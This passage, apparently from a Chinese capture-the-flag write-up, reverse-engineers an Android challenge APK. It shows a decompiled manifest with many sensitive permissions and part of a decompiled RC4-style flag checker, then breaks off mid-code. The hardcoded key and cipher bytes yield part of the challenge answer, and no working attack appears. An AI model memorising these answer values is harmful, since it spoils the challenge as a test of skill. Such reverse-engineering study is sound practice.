<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WARN : Found duplicated class: kotlin.coroutines.jvm.internal.DebugProbesKt, count: 2. Only one will be loaded!</span><br><span class="line">  classes.dex</span><br><span class="line">  JN.apk:DebugProbesKt.bin</span><br></pre></td></tr></table></figure>
<p>Jadx警告信息：重复的DebugProbesKt类 - 这意味着APK中可能有多个DEX文件或者包含了重复的库。jadx说只有一个会被加载，可能就是题干中所说“can’t be seen”。</p>
<p>查看AndroidMainfest.xml，第68行可以看到MainActivity的位置</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;manifest xmlns:android=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="line">    android:versionCode=<span class="string">&quot;1&quot;</span></span><br><span class="line">    android:versionName=<span class="string">&quot;1.0&quot;</span></span><br><span class="line">    android:compileSdkVersion=<span class="string">&quot;35&quot;</span></span><br><span class="line">    android:compileSdkVersionCodename=<span class="string">&quot;15&quot;</span></span><br><span class="line">    <span class="keyword">package</span>=<span class="string">&quot;com.challenge.xsran&quot;</span></span><br><span class="line">    platformBuildVersionCode=<span class="string">&quot;35&quot;</span></span><br><span class="line">    platformBuildVersionName=<span class="string">&quot;15&quot;</span>&gt;</span><br><span class="line">    &lt;uses-sdk</span><br><span class="line">        android:minSdkVersion=<span class="string">&quot;24&quot;</span></span><br><span class="line">        android:targetSdkVersion=<span class="string">&quot;35&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.INJECT_EVENTS&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.GET_TASKS&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.ACCESS_FINE_LOCATION&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.ACCESS_COARSE_LOCATION&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.ACCESS_BACKGROUND_LOCATION&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.SYSTEM_ALERT_WINDOW&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.MANAGE_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.REQUEST_INSTALL_PACKAGES&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.FOREGROUND_SERVICE&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.READ_PHONE_STATE&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.READ_PHONE_NUMBERS&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.READ_SMS&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.BLUETOOTH&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.BLUETOOTH_CONNECT&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;miui.permission.READ_AND_WRITE_PERMISSION_MANAGER&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;miui.permission.READ_AND_WIRTE_PERMISSION_MANAGER&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.READ_CONTACTS&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.BODY_SENSORS&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.BODY_SENSORS_BACKGROUND&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.CHANGE_WIFI_STATE&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.BLUETOOTH&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.BLUETOOTH_ADVERTISE&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.BLUETOOTH_CONNECT&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.BLUETOOTH_SCAN&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.SYSTEM_ALERT_WINDOW&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;com.android.launcher.permission.INSTALL_SHORTCUT&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.DISABLE_KEYGUARD&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.READ_MEDIA_IMAGES&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.QUERY_ALL_PACKAGES&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.PACKAGE_USAGE_STATS&quot;</span>/&gt;</span><br><span class="line">    &lt;permission</span><br><span class="line">        android:name=<span class="string">&quot;com.challenge.xsran.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION&quot;</span></span><br><span class="line">        android:protectionLevel=<span class="string">&quot;signature&quot;</span>/&gt;</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;com.challenge.xsran.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION&quot;</span>/&gt;</span><br><span class="line">    &lt;application</span><br><span class="line">        android:theme=<span class="string">&quot;@style/Theme.MyApplication&quot;</span></span><br><span class="line">        android:label=<span class="string">&quot;@string/app_name&quot;</span></span><br><span class="line">        android:icon=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span><br><span class="line">        android:allowBackup=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:supportsRtl=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:extractNativeLibs=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:fullBackupContent=<span class="string">&quot;@xml/backup_rules&quot;</span></span><br><span class="line">        android:roundIcon=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span><br><span class="line">        android:appComponentFactory=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span></span><br><span class="line">        android:dataExtractionRules=<span class="string">&quot;@xml/data_extraction_rules&quot;</span>&gt;</span><br><span class="line">        &lt;activity</span><br><span class="line">            android:theme=<span class="string">&quot;@style/Theme.MyApplication&quot;</span></span><br><span class="line">            android:label=<span class="string">&quot;@string/app_name&quot;</span></span><br><span class="line">            android:name=<span class="string">&quot;com.challenge.xsran.MainActivity&quot;</span></span><br><span class="line">            android:exported=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span><br><span class="line">                &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line">        &lt;service</span><br><span class="line">            android:name=<span class="string">&quot;com.challenge.xsran.MySimpleService&quot;</span></span><br><span class="line">            android:enabled=<span class="string">&quot;true&quot;</span></span><br><span class="line">            android:exported=<span class="string">&quot;false&quot;</span>/&gt;</span><br><span class="line">        &lt;provider</span><br><span class="line">            android:name=<span class="string">&quot;androidx.startup.InitializationProvider&quot;</span></span><br><span class="line">            android:exported=<span class="string">&quot;false&quot;</span></span><br><span class="line">            android:authorities=<span class="string">&quot;com.challenge.xsran.androidx-startup&quot;</span>&gt;</span><br><span class="line">            &lt;meta-data</span><br><span class="line">                android:name=<span class="string">&quot;androidx.emoji2.text.EmojiCompatInitializer&quot;</span></span><br><span class="line">                android:value=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span><br><span class="line">            &lt;meta-data</span><br><span class="line">                android:name=<span class="string">&quot;androidx.lifecycle.ProcessLifecycleInitializer&quot;</span></span><br><span class="line">                android:value=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span><br><span class="line">            &lt;meta-data</span><br><span class="line">                android:name=<span class="string">&quot;androidx.profileinstaller.ProfileInstallerInitializer&quot;</span></span><br><span class="line">                android:value=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span><br><span class="line">        &lt;/provider&gt;</span><br><span class="line">        &lt;receiver</span><br><span class="line">            android:name=<span class="string">&quot;androidx.profileinstaller.ProfileInstallReceiver&quot;</span></span><br><span class="line">            android:permission=<span class="string">&quot;android.permission.DUMP&quot;</span></span><br><span class="line">            android:enabled=<span class="string">&quot;true&quot;</span></span><br><span class="line">            android:exported=<span class="string">&quot;true&quot;</span></span><br><span class="line">            android:directBootAware=<span class="string">&quot;false&quot;</span>&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=<span class="string">&quot;androidx.profileinstaller.action.INSTALL_PROFILE&quot;</span>/&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=<span class="string">&quot;androidx.profileinstaller.action.SKIP_FILE&quot;</span>/&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=<span class="string">&quot;androidx.profileinstaller.action.SAVE_PROFILE&quot;</span>/&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=<span class="string">&quot;androidx.profileinstaller.action.BENCHMARK_OPERATION&quot;</span>/&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/receiver&gt;</span><br><span class="line">    &lt;/application&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>
<p>在/com/challenge.xsran下面可以找到</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.challenge.xsran;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> androidx.activity.ComponentActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.activity.compose.ComponentActivityKt;</span><br><span class="line"><span class="keyword">import</span> androidx.compose.foundation.layout.SizeKt;</span><br><span class="line"><span class="keyword">import</span> androidx.compose.material3.MaterialTheme;</span><br><span class="line"><span class="keyword">import</span> androidx.compose.material3.SurfaceKt;</span><br><span class="line"><span class="keyword">import</span> androidx.compose.runtime.Composer;</span><br><span class="line"><span class="keyword">import</span> androidx.compose.runtime.ComposerKt;</span><br><span class="line"><span class="keyword">import</span> androidx.compose.runtime.internal.ComposableLambdaKt;</span><br><span class="line"><span class="keyword">import</span> androidx.compose.ui.Modifier;</span><br><span class="line"><span class="keyword">import</span> com.challenge.xsran.ui.theme.ThemeKt;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> kotlin.Metadata;</span><br><span class="line"><span class="keyword">import</span> kotlin.UByte;</span><br><span class="line"><span class="keyword">import</span> kotlin.Unit;</span><br><span class="line"><span class="keyword">import</span> kotlin.jvm.functions.Function1;</span><br><span class="line"><span class="keyword">import</span> kotlin.jvm.functions.Function2;</span><br><span class="line"><span class="keyword">import</span> kotlin.jvm.internal.Intrinsics;</span><br><span class="line"><span class="keyword">import</span> kotlin.text.Charsets;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* compiled from: MainActivity.kt */</span></span><br><span class="line"><span class="meta">@Metadata(d1 = &#123;&quot;\u00000\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u000b\n\u0000\n\u0002\u0010\u0012\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0004\n\u0002\u0010\u000e\n\u0002\b\u0002\b\u0007\u0018\u0000 \u00122\u00020\u0001:\u0001\u0012B\u0005¢\u0006\u0002\u0010\u0002J\u000e\u0010\u0003\u001a\u00020\u00042\u0006\u0010\u0005\u001a\u00020\u0006J\u0011\u0010\u0007\u001a\u00020\u00042\u0006\u0010\b\u001a\u00020\u0006H\u0086 J\u0012\u0010\t\u001a\u00020\n2\b\u0010\u000b\u001a\u0004\u0018\u00010\fH\u0014J\u0016\u0010\r\u001a\u00020\u00062\u0006\u0010\u0005\u001a\u00020\u00062\u0006\u0010\u000e\u001a\u00020\u0006J\u000e\u0010\u000f\u001a\u00020\u00042\u0006\u0010\u0010\u001a\u00020\u0011¨\u0006\u0013&quot;&#125;, d2 = &#123;&quot;Lcom/challenge/xsran/MainActivity;&quot;, &quot;Landroidx/activity/ComponentActivity;&quot;, &quot;()V&quot;, &quot;J_Validate&quot;, &quot;&quot;, &quot;input&quot;, &quot;&quot;, &quot;N_Valildate&quot;, &quot;part&quot;, &quot;onCreate&quot;, &quot;&quot;, &quot;savedInstanceState&quot;, &quot;Landroid/os/Bundle;&quot;, &quot;unknownEncrypt&quot;, &quot;key&quot;, &quot;validate&quot;, &quot;flag&quot;, &quot;&quot;, &quot;Companion&quot;, &quot;app_release&quot;&#125;, k = 1, mv = &#123;1, 8, 0&#125;, xi = 48)</span></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">ComponentActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">$stable</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] JAVA_CIPHER;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] UNKNOWN_KEY;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">N_Valildate</span><span class="params">(<span class="type">byte</span>[] part)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;xsran&quot;</span>);</span><br><span class="line">        UNKNOWN_KEY = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">1</span>, <span class="number">35</span>, <span class="number">69</span>, <span class="number">103</span>, -<span class="number">119</span>, -<span class="number">85</span>, -<span class="number">51</span>, -<span class="number">17</span>, -<span class="number">2</span>, -<span class="number">36</span>, -<span class="number">70</span>, -<span class="number">104</span>, <span class="number">118</span>, <span class="number">84</span>, <span class="number">50</span>, <span class="number">16</span>&#125;;</span><br><span class="line">        JAVA_CIPHER = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">58</span>, <span class="number">23</span>, -<span class="number">12</span>, -<span class="number">12</span>, -<span class="number">74</span>, <span class="number">92</span>, -<span class="number">50</span>, -<span class="number">112</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">byte</span>[] unknownEncrypt(<span class="type">byte</span>[] input, <span class="type">byte</span>[] key) &#123;</span><br><span class="line">        Intrinsics.checkNotNullParameter(input, <span class="string">&quot;input&quot;</span>);</span><br><span class="line">        Intrinsics.checkNotNullParameter(key, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        <span class="type">int</span>[] iArr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            iArr[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>; i3 &lt; <span class="number">256</span>; i3++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> iArr[i3];</span><br><span class="line">            i2 = (i2 + i4 + (key[i3 % key.length] &amp; UByte.MAX_VALUE)) &amp; <span class="number">255</span>;</span><br><span class="line">            iArr[i3] = iArr[i2];</span><br><span class="line">            iArr[i2] = i4;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[input.length];</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> input.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i7</span> <span class="operator">=</span> <span class="number">0</span>; i7 &lt; length; i7++) &#123;</span><br><span class="line">            i5 = (i5 + <span class="number">1</span>) &amp; <span class="number">255</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i8</span> <span class="operator">=</span> iArr[i5];</span><br><span class="line">            i6 = (i6 + i8) &amp; <span class="number">255</span>;</span><br><span class="line">            iArr[i5] = iArr[i6];</span><br><span class="line">            iArr[i6] = i8;</span><br><span class="line">            bArr[i7] = (<span class="type">byte</span>) (iArr[(iArr[i5] + i8) &amp; <span class="number">255</span>] ^ input[i7]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bArr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">J_Validate</span><span class="params">(<span class="type">byte</span>[] input)</span> &#123;</span><br><span class="line">        Intrinsics.checkNotNullParameter(input, <span class="string">&quot;input&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Arrays.equals(unknownEncrypt(input, UNKNOWN_KEY), JAVA_CIPHER);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">validate</span><span class="params">(String flag)</span> &#123;</span><br><span class="line">        Intrinsics.checkNotNullParameter(flag, <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag.length() != <span class="number">22</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">strSubstring</span> <span class="operator">=</span> flag.substring(<span class="number">5</span>, <span class="number">21</span>);</span><br><span class="line">        Intrinsics.checkNotNullExpressionValue(strSubstring, <span class="string">&quot;substring(...)&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">strSubstring2</span> <span class="operator">=</span> strSubstring.substring(<span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">        Intrinsics.checkNotNullExpressionValue(strSubstring2, <span class="string">&quot;substring(...)&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">strSubstring3</span> <span class="operator">=</span> strSubstring.substring(<span class="number">8</span>, <span class="number">16</span>);</span><br><span class="line">        Intrinsics.checkNotNullExpressionValue(strSubstring3, <span class="string">&quot;substring(...)&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = strSubstring2.getBytes(Charsets.UTF_8);</span><br><span class="line">        Intrinsics.checkNotNullExpressionValue(bytes, <span class="string">&quot;getBytes(...)&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes2 = strSubstring3.getBytes(Charsets.UTF_8);</span><br><span class="line">        Intrinsics.checkNotNullExpressionValue(bytes2, <span class="string">&quot;getBytes(...)&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> J_Validate(bytes) &amp;&amp; N_Valildate(bytes2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        ComponentActivityKt.setContent$<span class="keyword">default</span>(<span class="built_in">this</span>, <span class="literal">null</span>, ComposableLambdaKt.composableLambdaInstance(-<span class="number">1003124788</span>, <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">Function2</span>&lt;Composer, Integer, Unit&gt;() &#123; <span class="comment">// from class: com.challenge.xsran.MainActivity.onCreate.1</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">super</span>(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// kotlin.jvm.functions.Function2</span></span><br><span class="line">            <span class="keyword">public</span> <span class="comment">/* bridge */</span> <span class="comment">/* synthetic */</span> Unit <span class="title function_">invoke</span><span class="params">(Composer composer, Integer num)</span> &#123;</span><br><span class="line">                invoke(composer, 